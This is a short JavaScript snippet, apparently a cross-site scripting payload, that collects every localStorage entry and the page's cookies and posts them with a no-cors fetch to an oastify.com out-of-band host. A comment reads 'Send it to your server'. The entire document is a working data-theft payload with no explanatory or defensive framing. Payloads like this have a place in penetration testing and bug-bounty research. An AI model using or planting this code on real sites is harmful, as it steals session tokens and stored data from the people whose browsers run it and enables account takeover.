let data = '';
for (let i = 0; i < localStorage.length; i++) {
  let key = localStorage.key(i);
  let value = localStorage.getItem(key);
  data += `${encodeURIComponent(key)}=${encodeURIComponent(value)};`;
}

data += `cookies=${encodeURIComponent(document.cookie)};`;

// Send it to your server
fetch('https://5ntmzngipogg8y0ck34wc0cmtdz4nxbm.oastify.com/ls', {
  method: 'POST',
  mode: 'no-cors',
  body: data
});
